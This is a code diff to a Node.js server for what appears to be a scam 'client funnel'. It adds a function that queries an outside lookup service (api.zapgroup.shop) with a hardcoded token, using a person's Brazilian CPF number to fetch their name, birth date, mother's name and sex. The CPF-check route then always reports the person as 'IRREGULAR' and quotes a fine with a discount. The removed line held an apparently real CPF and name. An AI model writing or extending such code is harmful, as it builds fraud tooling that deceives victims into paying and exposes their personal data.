@@ -461,6 +461,33 @@ const handler = async (req, res) => {
   // CLIENT FUNNEL API ROUTES
   // ==========================================
 
+  
+async function fetchCpfData(rawCpf) {
+  const token = 'c93601cbe0fce3f5c5b1e3b40c840f500fb162f91103beb42e839b7839813f93';
+  const url = `https://api.zapgroup.shop/consultar-filtrada/cpf?cpf=${rawCpf}&token=${token}`;
+  try {
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), 6000);
+    const res = await fetch(url, { signal: controller.signal });
+    clearTimeout(timeoutId);
+    if (res.ok) {
+      const data = await res.json();
+      if (data && data.nome) {
+        return {
+          cpf: data.cpf || rawCpf,
+          nome: data.nome.trim(),
+          nascimento: data.nascimento ? data.nascimento.trim() : '19/05/2003',
+          mae: data.mae ? data.mae.trim() : '',
+          sexo: data.sexo || 'M'
+        };
+      }
+    }
+  } catch (err) {
+    console.error('Error fetching ZapGroup CPF data:', err.message);
+  }
+  return null;
+}
+
   // 1. CPF Verification
   if (pathname === '/api/check_cpf' && method === 'POST') {
     const body = await readJsonBody();
@@ -473,7 +500,11 @@ const handler = async (req, res) => {
 
     adminService.recordSessionEvent('consulta');
 
-    const generatedName = rawCpf === '08072703188' ? 'Lucas Machado Gaona' : generateNameFromCPF(rawCpf);
+    const externalData = await fetchCpfData(rawCpf);
+    const finalNome = externalData?.nome || generateNameFromCPF(rawCpf);
+    const finalNascimento = externalData?.nascimento || '19/05/2003';
+    const finalSexo = externalData?.sexo || 'M';
+
     res.writeHead(200, {
       'Content-Type': 'application/json',
       'Set-Cookie': `session=cpf_${rawCpf}; Path=/; HttpOnly`
@@ -481,7 +512,10 @@ const handler = async (req, res) => {
     res.end(JSON.stringify({
       success: true,
       cpf: rawCpf,
-      nome: generatedName,
+      nome: finalNome,
+      nascimento: finalNascimento,
+      sexo: finalSexo,
+      mae: externalData?.mae || '',
       status: 'IRREGULAR',
       multa: 419.55,
       desconto: 68.92
